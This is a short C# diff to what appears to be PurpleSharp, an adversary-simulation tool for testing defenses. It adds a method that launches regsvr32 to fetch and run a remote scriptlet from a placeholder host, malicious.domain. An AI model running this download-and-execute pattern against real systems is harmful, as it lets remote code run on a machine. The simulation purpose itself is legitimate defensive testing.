@@ -11,7 +11,11 @@ namespace PurpleSharp.Simulations
         static public void ExecutePowershell()
         {
             ExecutionHelper.StartProcess("", "powershell.exe -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAbgBvAHQAZQBwAGEAZAA=");
+        }
 
+        static public void ExecuteRegsvr32()
+        {
+            ExecutionHelper.StartProcess("", "regsvr32.exe /u /n /s /i:http://malicious.domain:8080/payload.sct scrobj.dll");
         }
 
     }
